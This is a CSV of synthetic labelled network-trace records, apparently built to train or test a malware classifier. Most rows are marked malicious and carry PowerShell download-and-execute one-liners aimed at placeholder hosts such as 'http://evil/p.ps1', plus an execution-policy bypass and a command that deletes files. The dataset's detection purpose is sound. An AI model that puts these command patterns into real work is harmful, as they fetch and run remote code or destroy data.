trace_id,sequence,valid,description,category,content
ce63fd87eec9a491.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
e9b01a9d5044c3a5.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
5fa297d576b47dcc.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
c36134c655edc963.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
09dccd720a1d0d15.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
24b0135b502448ee.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
80d3d281ab93307f.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
5ab488d7e4eed100.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
f1ba64a3e1f36357.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
bcc264b7807cd2b2.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
e0ca440ec5680e3e.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
bced7bcc1265b5d9.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
3ce6f5e9aee5a3f9.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
3e05ff2ce8fce338.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
bc0eb9a139ab2a92.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
1c2ea5be23821d4b.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
82c25613755c7a3a.txt,SYN|SYN-ACK|ACK|FIN|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Changelog: fixed bugs and improved docs.
20d8e5832a6c57c6.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
d6a768c2e415a562.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
80d08b3f1be87e21.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
b99fbefd4912483c.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
ff7ec29403366fea.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
de4eb316e4bfc3c9.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
f300fd656d847f7b.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
93f05b78d5f7fb0a.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
6ddb1d0ca9d5c0a7.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
e8082fecf3789fed.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
bf2a36b7c773c1b5.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
3bcf35be00c1705b.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
b4463b569de51af7.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
e9dcdd05f3bee021.txt,SYN|SYN-ACK|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,User guide: usage instructions and notes.
5cbfce314e14e7e9.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
a4b1c1194ffdb167.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
bf7897b7e40b8545.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
40fa80a89b068b5d.txt,SYN|SYN-ACK|ACK|FIN|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,"Lorem ipsum dolor sit amet, consectetur adipiscing elit."
3f22e9eb5e302c45.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
4ddd07f381f5d2a8.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
ecdbff79180b1bcb.txt,SYN|SYN-ACK|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Configuration: key=value pairs; no executable content.
d3befb9b39a56d11.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
779155616e4ffda5.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
0386d93e49b12c51.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
26f2e577524304ed.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
334e992726b49be1.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
3bac36f5fa513dd5.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
06078e21181a1196.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
4777389be58f8b65.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
4929bd01ddfa04c0.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
3b25a614c377a4b4.txt,SYN|SYN-ACK|ACK|FIN|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,"Lorem ipsum dolor sit amet, consectetur adipiscing elit."
43a02dab7a0673eb.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
ae09c3aa53af5cd5.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
5bf05e7a277a6f20.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
35470b8e178d48b2.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
b9ba3a88356a596b.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
9a6e7e689643c05d.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
851331115a04e1af.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
a8e7f9617d12eb77.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
ec4749ccc459451f.txt,SYN|SYN-ACK|ACK|DATA|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Readme: This is a harmless text file.
6cfb73db148acd49.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
2c0aaddbefb4eca4.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
578bcf28496bd5dd.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
0bddf95b8e65f553.txt,SYN|SYN-ACK|ACK|DATA|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,User guide: usage instructions and notes.
babbbb986c957825.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
1ebbcdcba9cd9122.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
b08ba532b43fe11e.txt,SYN|SYN-ACK|ACK|FIN|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,"Lorem ipsum dolor sit amet, consectetur adipiscing elit."
789506c878e73672.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
4e194eb7d4d431f2.txt,SYN|SYN-ACK|ACK|FIN|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Changelog: fixed bugs and improved docs.
2ad71f7b8fca4e5c.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
37f6cf0b5ddc14e3.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
69a35069b7951f06.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
7f36b7701f60664b.txt,SYN|SYN-ACK|ACK|FIN|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Changelog: fixed bugs and improved docs.
1cdce53d0462d824.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
c66e2f5c4e352fe5.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
dbd94018814b95de.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
2dac2fec53d44eec.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
dc14743f0c58595e.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
372572f4a64e8713.txt,SYN|SYN-ACK|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Configuration: key=value pairs; no executable content.
0ce7540a1afd2ad3.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
31ac466074babd47.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
8d23ab287321aa51.txt,SYN|SYN-ACK|ACK|FIN|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Changelog: fixed bugs and improved docs.
88f6518471d567fd.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
97422a1516c75b73.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
fbf88a3eb444bef4.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
7c56242e311b20ed.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
4c8d3115080bb341.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
94842a96168d7a05.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
5738e594b750e5f0.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
d511bbb830d68a8e.txt,SYN|SYN-ACK|ACK|DATA|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Configuration: key=value pairs; no executable content.
b092b05340dbdbfd.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
dd93302af4314e28.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
f2a7610878aa6155.txt,SYN|SYN-ACK|ACK|FIN|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,User guide: usage instructions and notes.
7ab4a27812e54a0a.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
2df60b4d72c56b0e.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
2f18dc7186cd7566.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
2a1d8692f445791d.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
d70875cc2f9e7b41.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
e9bb878baee7f8e2.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
54c99cbe46bf228e.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
ad33d30e56743db5.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
b75e3f6b7ebc53b1.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
3a24d29c1a065e91.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
57a7f3fcf95f8b8f.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
cf4af5a28c413d6a.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
66b8b12cf28cf392.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
492221cf511865f5.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
efb761d064a05326.txt,SYN|SYN-ACK|ACK|DATA|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Configuration: key=value pairs; no executable content.
1301c1d6ae64525d.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
fbb3fe3c2daed030.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
27c347612d0c4569.txt,SYN|SYN-ACK|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,User guide: usage instructions and notes.
